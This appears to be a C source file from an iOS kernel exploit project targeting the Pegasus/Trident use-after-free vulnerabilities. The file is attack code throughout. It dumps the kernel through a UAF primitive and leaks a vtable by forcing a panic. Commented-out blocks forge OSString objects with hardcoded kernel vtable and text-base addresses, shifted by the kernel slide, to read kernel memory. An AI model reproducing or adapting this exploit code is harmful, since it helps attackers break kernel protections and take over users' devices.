#include <stddef.h>             // size_t

#include "common.h"             // ERROR
#include "io.h"                 // OSString, kOSStringNoCopy
#include "libexploit.h"         // uaf_get_bytes
#include "slide.h"              // get_kernel_slide
#include "uaf_read.h"           // uaf_get_bytes
#include "uaf_panic.h"          // uaf_panic_leak_vtab

#include "exploit.h"

void panic_leak()
{
    uaf_panic_leak_vtab();

    ERROR("Well, that didn't work. Are you sure your iOS version is vulnerable to Pegasus/Trident?");
}

void exploit()
{
    file_t kernel = uaf_dump_kernel();

    free(kernel.buf);
    /*size_t kslide = get_kernel_slide();
    OSString osstr =
    {
        .vtab = (void*)(0xffffff80044ef1f0 + kslide),   // TODO: hardcoded
        .retainCount = 100,                             // don't try to free this
        .flags = kOSStringNoCopy,                       // and neither the "string" it points to
        .length = 0x1000,                               // can't get more than 0x1000 at once
        .string = (void*)(0xffffff8004004000 + kslide), // kernel text base
    };
    char buf[0x1000];
    uaf_get_bytes(&osstr, buf, 0x1000);*/

    /*OSString osstr =
    {
        .vtab = (vtab_t)(0xffffff8004536370 + kslide) - 4,
        .retainCount = 100,
        .flags = kOSStringNoCopy,
        .length = 0x0,
        .string = NULL,
    };
    uaf_parse(&osstr);*/

    /*OSString osstr =
    {
        .vtable      = (void*)0x0,
        .retainCount =        0x0,
        .flags       =        0x0,
        .length      =        0x0,
        .string      = (void*)0x0,
    };
    uaf_parse(&osstr);*/
}
